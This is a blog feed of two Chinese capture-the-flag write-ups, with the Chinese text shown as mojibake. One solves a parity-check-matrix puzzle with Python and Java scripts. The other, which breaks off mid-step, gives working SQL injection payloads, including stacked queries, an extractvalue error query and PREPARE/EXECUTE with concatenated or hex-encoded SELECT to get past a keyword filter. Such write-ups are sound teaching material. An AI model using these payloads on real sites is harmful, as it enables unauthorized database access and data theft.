    <content type="html"><![CDATA[<h1 id="SUSCTF-2022-Tanner"><a href="#SUSCTF-2022-Tanner" class="headerlink" title="[SUSCTF 2022]Tanner"></a>[SUSCTF 2022]Tanner</h1><p>é¢˜ç›®æè¿°ä¸­æåˆ°:<code>There is a special graph which describe one check matrix, find out where is the hint(maybe in the binary data?) and what is the flag.</code></p><p>æˆ‘ä»¬æŸ¥çœ‹åˆ°Pngæ–‡ä»¶ç»“æŸæ ‡å¿—[49 45 4E 44 AE 42 60 82]åæœ‰ä¿¡æ¯ä¿¡æ¯ï¼š<br><code>THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front)</code></p><p>æ„æ€æ˜¯flag æ˜¯æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰<strong>åˆæ³•ç å­—</strong>ï¼ˆæŒ‰äºŒè¿›åˆ¶â€œåŠ æ³•â€æ±‚å’Œï¼‰çš„ <strong>SHA-256 å“ˆå¸Œå€¼</strong>ã€‚<br> ï¼ˆæ³¨æ„ï¼šç»“æœçš„äºŒè¿›åˆ¶æ•°<strong>å‰é¢ä¸èƒ½æœ‰å¤šä½™çš„ 0</strong>ã€‚ï¼‰</p><p>æˆ‘ä»¬çœ‹é™„ä»¶è¿™å¼ å›¾å±•ç¤ºçš„æ˜¯ä¸€ç§å« <strong>Tanner graphï¼ˆå¦çº³å›¾ï¼‰</strong> çš„ç»“æ„ï¼Œç”¨æ¥è¡¨ç¤ºçº¿æ€§åˆ†ç»„ç ï¼ˆLinear Block Codeï¼‰ä¸­çš„<strong>æ ¡éªŒçŸ©é˜µï¼ˆParity-Check Matrix, Hï¼‰</strong>ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/Tannergraph.png" alt="Tannergraph"></p><p>æ–¹æ¡†ï¼ˆfâ‚€â€“fâ‚„ï¼‰ä»£è¡¨ <strong>æ ¡éªŒèŠ‚ç‚¹ï¼ˆcheck nodesï¼‰</strong>ï¼Œ<br> åœ†åœˆï¼ˆcâ‚€â€“câ‚‰ï¼‰ä»£è¡¨ <strong>æ¯”ç‰¹èŠ‚ç‚¹ï¼ˆbit nodesï¼‰</strong>ã€‚</p><p>æ¯ä¸ªæ ¡éªŒèŠ‚ç‚¹å¯¹åº”æ ¡éªŒçŸ©é˜µ H çš„ä¸€è¡Œï¼Œæ¯ä¸ªæ¯”ç‰¹èŠ‚ç‚¹å¯¹åº”ä¸€åˆ—ã€‚<br> æœ‰è¿çº¿è¡¨ç¤ºæŸä¸ªæ¯”ç‰¹åœ¨è¯¥æ ¡éªŒæ–¹ç¨‹ä¸­å‚ä¸å¼‚æˆ–ï¼ˆXORï¼‰è®¡ç®—ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœçŸ©é˜µå…ƒç´  <code>H[i][j] = 1</code>ï¼Œå°±åœ¨å›¾ä¸­è¿çº¿<code> fáµ¢ â†” câ±¼</code>ã€‚<br> æ ¡éªŒæ¡ä»¶æ˜¯ï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">H * cáµ€ = <span class="hljs-number">0</span>   ï¼ˆ<span class="hljs-built_in">mod</span> <span class="hljs-number">2</span>ï¼‰<br></code></pre></td></tr></table></figure><p>æ¢å¥è¯è¯´ï¼Œæ¯ä¸ª fáµ¢ çš„ç›¸è¿ câ±¼ æ¯”ç‰¹ä¹‹å’Œ mod 2 å¿…é¡»ç­‰äº 0ã€‚</p><p>ä»€ä¹ˆæ˜¯â€œåˆæ³•ç å­—ï¼ˆproper codewordï¼‰â€</p><p>ä¸€ä¸ª <strong>åˆæ³•ç å­—</strong>ï¼ˆæˆ–ç§°â€œæœ‰æ•ˆç å­—â€ï¼‰å°±æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º n çš„äºŒè¿›åˆ¶å‘é‡<br> <code>c = [câ‚€, câ‚, â€¦, câ‚‰]</code>ï¼Œ<br> å®ƒæ»¡è¶³ä¸Šé¢çš„æ ¡éªŒæ¡ä»¶ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">H</span> * cáµ€ = <span class="hljs-number">0</span>  (mod <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰æ ¡éªŒèŠ‚ç‚¹çš„å¼‚æˆ–ç»“æœéƒ½ä¸º 0ã€‚</p><p>è¿™äº›åˆæ³•ç å­—æ„æˆäº†è¿™ä¸ªçº¿æ€§ç çš„<strong>ç ç©ºé—´ï¼ˆcode spaceï¼‰</strong>ã€‚</p><p>æ ¹æ®ä¸Šè¿°çŸ¥è¯†å¾—è¿˜åŸçŸ©é˜µ</p><table><thead><tr><th>c0</th><th>c1</th><th>c2</th><th>c3</th><th>c4</th><th>c5</th><th>c6</th><th>c7</th><th>c8</th><th>c9</th><th></th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>f0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>f1</td></tr><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>f2</td></tr><tr><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>f3</td></tr><tr><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>f4</td></tr></tbody></table><p>ç¬¬äºŒæ­¥ï¼šæ ¹æ®æ ¡éªŒçŸ©é˜µï¼Œå¯ä»¥ç”¨è„šæœ¬è¿˜åŸç å­—</p><p>è„šæœ¬æ¥æºï¼š<a href="https://blog.csdn.net/weixin_45770420/article/details/124063129">SUSCTF2022miscâ€”â€”Tanner_susctf2022 tanner-CSDNåšå®¢</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author: Jack Jparrow</span><br><span class="hljs-string">Date: 2022-02-27 12:01:40</span><br><span class="hljs-string">LastEditTime: 2022-02-27 12:25:23</span><br><span class="hljs-string">LastEditors: Jack Jparrow</span><br><span class="hljs-string">Description: æ ¹æ®æ ¡éªŒçŸ©é˜µæ±‚ç å­—</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>N = <span class="hljs-number">10</span><br>K = <span class="hljs-number">5</span><br>b = []<br>H = np.array([[ <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>            [ <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>            [ <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],<br>            [ <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],<br>            [ <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**N):<br>    a = <span class="hljs-built_in">format</span>(i, <span class="hljs-string">&#x27;b&#x27;</span>)<br>    b.append(<span class="hljs-string">&quot;&#123;:0&gt;10s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(a))<br><br>v = np.zeros((<span class="hljs-number">2</span>**N, N))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**N):<br>    v[i] = b[i]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        v[i][j] = b[i][j] <span class="hljs-comment"># væ˜¯0000000~1111111</span><br><br>w = np.zeros((<span class="hljs-number">1</span>, N - K))<br><span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**N):<br>    <span class="hljs-keyword">if</span> np.<span class="hljs-built_in">all</span>(np.dot(v[o], H.T) % <span class="hljs-number">2</span> == w):<br>        <span class="hljs-built_in">print</span>(v[o])<br><br></code></pre></td></tr></table></figure><p>ä¹‹åä¾æ®</p><p><em><strong>flag æ˜¯æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰</strong>åˆæ³•ç å­—</em><em>ï¼ˆæŒ‰äºŒè¿›åˆ¶â€œåŠ æ³•â€æ±‚å’Œï¼‰çš„ SHA-256 å“ˆå¸Œå€¼ã€‚<br> ï¼ˆæ³¨æ„ï¼šç»“æœçš„äºŒè¿›åˆ¶æ•°**å‰é¢ä¸èƒ½æœ‰å¤šä½™çš„ 0</em>ã€‚ï¼‰</p><p>å¯¹ç å­—ç¨åŠ å¤„ç†ï¼ŒåªæŒ‰è¡Œç•™ä¸‹äºŒè¿›åˆ¶æ•°å€¼ï¼Œè¿›è¡ŒäºŒè¿›åˆ¶ç´¯åŠ æ±‚å’Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;<br><br>/**<br> * @Author: Jack Jparrow<br> * @Date: <span class="hljs-number">2022</span>-02-<span class="hljs-number">27</span> <span class="hljs-number">14</span>:<span class="hljs-number">14</span>:<span class="hljs-number">12</span><br> * @LastEditTime: <span class="hljs-number">2022</span>-03-04 <span class="hljs-number">14</span>:<span class="hljs-number">55</span>:<span class="hljs-number">39</span><br> * @LastEditors: Jack Jparrow<br> * @Description: è¯»æ–‡ä»¶ï¼Œæ±‚å’Œ<br> */<br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tanner</span> &#123;<br>    public static void main(String[] args) &#123;<br>        <span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>;// å’Œ<br><br>        File myFile = new File(<span class="hljs-string">&quot;D:\\Desktop\\res.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            InputStreamReader Reader = new InputStreamReader(new FileInputStream(myFile), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            BufferedReader bufferedReader = new BufferedReader(Reader);<br><br>            String lineTxt = null;<br><br>            <span class="hljs-keyword">while</span> ((lineTxt = bufferedReader.readLine()) != null) &#123;<br><br>                <span class="hljs-built_in">sum</span> += Integer.parseInt(lineTxt, <span class="hljs-number">2</span>);// æ±‚å’Œ<br>                <br>                Reader.close();<br>            &#125;<br><br>            System.out.println(Integer.toBinaryString(<span class="hljs-built_in">sum</span>));// è¾“å‡ºç»“æœçš„äºŒè¿›åˆ¶å½¢å¼<br><br>        &#125; catch (UnsupportedEncodingException e) &#123;<br>            // TODO Auto-generated catch block<br>            e.printStackTrace();<br>        &#125; catch (FileNotFoundException e) &#123;<br>            // TODO Auto-generated catch block<br>            e.printStackTrace();<br>        &#125; catch (IOException e) &#123;<br>            // TODO Auto-generated catch block<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å°†ç»“æœè¿›è¡Œsha256åŠ å¯†ï¼ŒåŠ ä¸ŠNSSCTF{}å³ä¸ºflag</p><p>å¾—åˆ°çš„ <code>flag</code> å°±æ˜¯é¢˜ç›®è¦æ±‚çš„ï¼š</p><blockquote><p>flag&#x3D;<strong>NSSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}</strong></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NSSCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Â–[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ã€SQLæ³¨å…¥ã€‘</title>
    <link href="/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/"/>
    <url>/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1ã€SQLæ³¨å…¥ã€‘"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1ã€SQLæ³¨å…¥ã€‘" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ã€SQLæ³¨å…¥ã€‘"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ã€SQLæ³¨å…¥ã€‘</h1><p>æœ¬æ–‡ç« ä¸­æ ‡é¢˜ä¸ºä¸ªæ­¥éª¤æ¶‰åŠåˆ°çš„æ–¹æ³•ã€‚</p><h3 id="SQLæŸ¥è¯¢"><a href="#SQLæŸ¥è¯¢" class="headerlink" title="SQLæŸ¥è¯¢"></a>SQLæŸ¥è¯¢</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-19_18-28-50.png" alt="PixPin_2025-10-19_18-28-50"></p><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆåˆ¤æ–­æ³¨å…¥ç‚¹çš„ä¼ å‚æ–¹å¼ï¼Œå‘ç°æ˜¯getä¼ å‚ã€‚</p><p>åœ¨è¾“å…¥æ¡†ï¼Œéšä¾¿è¾“å…¥<code>1&#39; or 1 = 1</code>ï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p>æäº¤åæç¤º<code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;&#39; at line 1</code>ï¼Œè¯´æ˜åç«¯å‚æ•°åé¢æœ‰å¯èƒ½å­˜åœ¨å…¶ä»–sqlè¯­å¥ï¼Œæˆ‘ä»¬åœ¨1â€™ or 1 &#x3D; 1åé¢åŠ ä¸€ä¸ª#ï¼Œå°†å¯èƒ½å­˜åœ¨çš„å…¶ä»–sqlè¯­å¥æ³¨é‡Šæ‰ï¼Œå³ï¼š<code>1&#39; or 1 = 1#</code>ï¼ŒæˆåŠŸè¾“å‡ºäº†è¯¥è¡¨çš„æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯æ²¡æœ‰flagã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019183117613.png" alt="image-20251019183117613"></p><p>é¦–å…ˆåˆ¤æ–­ä¸€ä¸‹å­—æ®µä¸ªæ•°ï¼š<code>-1&#39; union select 1,2;#</code>ï¼Œç³»ç»Ÿæç¤º<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019184100891.png" alt="image-20251019184100891"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»ŸæŠŠselectç­‰å…³é”®è¯éƒ½è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥çš„æ–¹å¼æ¥ç»•è¿‡selectå…³é”®å­—ã€‚</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>ç®€å•ä»‹ç»ä¸€ä¸‹å †å æ³¨å…¥ï¼Œ<strong>å †å æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰</strong>æ˜¯ä¸€ç§ SQL æ³¨å…¥æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥å¤šä¸ª SQL è¯­å¥åˆ°ä¸€ä¸ªæŸ¥è¯¢ä¸­ï¼Œåˆ©ç”¨æ•°æ®åº“æ”¯æŒå †å æŸ¥è¯¢çš„ç‰¹æ€§ï¼ˆå³åœ¨åŒä¸€æ¡æŸ¥è¯¢ä¸­æ‰§è¡Œå¤šä¸ª SQL è¯­å¥ï¼‰æ¥æ‰§è¡Œæ¶æ„æ“ä½œã€‚è¿™ç±»æ”»å‡»åˆ©ç”¨äº†æŸäº›æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰å…è®¸å¤šä¸ª SQL è¯­å¥åœ¨ä¸€ä¸ªæŸ¥è¯¢ä¸­å †å æ‰§è¡Œçš„ç‰¹æ€§ï¼Œé€šå¸¸é€šè¿‡åˆ†å·ï¼ˆ;ï¼‰åˆ†éš”ä¸åŒçš„ SQL è¯­å¥ã€‚</p><p>æŸ¥çœ‹æ•°æ®åº“åï¼š<code>1&#39;;show databases;#</code></p><p><img src="D:\work\notebook\ontebook\CTF\webå­¦ä¹ \sqlæ³¨å…¥\assets\image-20251019202126770.png" alt="image-20251019202126770"></p><p>æŸ¥çœ‹æ•°æ®è¡¨ï¼š<code>1&#39;;show tables;#</code></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019202230281-1760876551147-2.png" alt="image-20251019202230281"></p><p>æŸ¥çœ‹è¡¨ç»“æ„</p><p>æ³¨æ„ï¼š<strong>tableNameå¦‚æœæ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨&#96;åŒ…è£¹</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?i</span>nject=<span class="hljs-number">1</span><span class="hljs-string">&#x27;; show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;desc <span class="hljs-string">`1919810931114514`</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>è¿™é‡Œæ˜¯ä¸­æ’ä¸€ç§æ€è·¯ï¼Œå› ä¸ºåœ¨æŠ¥é”™æ³¨å…¥æŸ¥è¯¢ æ•°æ®åº“åå­—çš„æ—¶å€™æ˜¯ä¸ç”¨selectçš„ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥ç”¨çš„ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e)))-- q</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åªèƒ½ç”¨äºæŸ¥è¯¢è¡¨æ˜ï¼Œæ•°æ®åº“åï¼ŒæŸ¥è¯¢å­—æ®µæ—¶ä¸èƒ½ç”¨è¿™ç§æ–¹æ³•ã€‚</p><h3 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h3><p>å…ˆè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯é¢„ç¼–è¯‘è¯­å¥ï¼Œ</p><p>é€šä¿—ç‰ˆä¸€ç‚¹ï¼Œå°±æ˜¯æŠŠ SQL å…ˆç»™æ•°æ®åº“â€œè¿‡ä¸€éè¯­æ³•ä¸ä¼˜åŒ–å™¨â€ï¼Œå¾—åˆ°å¯æ‰§è¡Œçš„<strong>æ‰§è¡Œè®¡åˆ’</strong>ï¼Œç„¶åå¤šæ¬¡æ‰§è¡Œæ—¶å°±<strong>å¤ç”¨è®¡åˆ’</strong>ï¼Œåªæ¢å‚æ•°ï¼Œä¸å¿…æ¯æ¬¡é‡æ–°è§£æä¸ä¼˜åŒ–ã€‚</p><p>æ ¼å¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> åç§° <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>è¯­å¥ ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> åç§° <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ–¹æ³•ä¸€ï¼š<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>#è¿™æ˜¯æ™®é€šçš„<span class="hljs-keyword">sql</span>æŸ¥è¯¢è¯­å¥<br><br>æ–¹æ³•äºŒï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br>#å°†é¢„ç¼–è¯‘è¯­å¥å‘½åä¸ºjia è¦æ‰§è¡Œçš„è¯­å¥æ˜¯<span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">EXECUTE</span> jia;<br>#è¡¨ç¤ºè¦æ‰§è¡Œjia<br><br>æ–¹æ³•ä¸‰ï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>#è¿™é‡Œè¡¨ç¤ºè¦æŸ¥è¯¢çš„IDå€¼ä¸º<span class="hljs-number">1</span><br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br>#å¯¹jiaè¯­å¥è¿›è¡Œäº†å¡«å……æ›¿æ¢ç„¶åæ‰§è¡Œ<br><br>æ–¹æ³•å››ï¼š<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><p>å› ä¸ºselectå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼æ‹¼æ¥select å…³é”®å­—ï¼š<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code>1919810931114514<code> &#39;);EXECUTE hacker;#</code>å¾—flagã€‚</p><h3 id="é¢„ç¼–è¯‘è¯­å¥-å°†è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç "><a href="#é¢„ç¼–è¯‘è¯­å¥-å°†è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç " class="headerlink" title="é¢„ç¼–è¯‘è¯­å¥ å°†è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç "></a>é¢„ç¼–è¯‘è¯­å¥ å°†è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç </h3><p>å¯ä»¥ç›´æ¥å°†<code>select * from </code>1919810931114514&#96;&#96;è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼Œå³ï¼š<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>ï¼Œæ›¿æ¢payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br></code></pre></td></tr></table></figure><h3 id="æ›´æ”¹è¡¨å"><a href="#æ›´æ”¹è¡¨å" class="headerlink" title="æ›´æ”¹è¡¨å"></a>æ›´æ”¹è¡¨å</h3><p>æœ€åä¸€æ­¥ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹è¡¨åå’Œåˆ—åæ¥å®ç°ã€‚æˆ‘ä»¬è¾“å…¥1åï¼Œé»˜è®¤ä¼šæ˜¾ç¤ºidä¸º1çš„æ•°æ®ï¼Œå¯ä»¥çŒœæµ‹é»˜è®¤æ˜¾ç¤ºçš„æ˜¯wordsè¡¨çš„æ•°æ®ï¼ŒæŸ¥çœ‹wordsè¡¨ç»“æ„ç¬¬ä¸€ä¸ªå­—æ®µåä¸º<code>id</code>æˆ‘ä»¬æŠŠwordsè¡¨éšä¾¿æ”¹æˆwords1ï¼Œç„¶åæŠŠ1919810931114514è¡¨æ”¹æˆwordsï¼Œå†æŠŠåˆ—åflagæ”¹æˆidï¼Œå°±å¯ä»¥è¾¾åˆ°ç›´æ¥è¾“å‡ºflagå­—æ®µçš„å€¼çš„æ•ˆæœï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">`<span 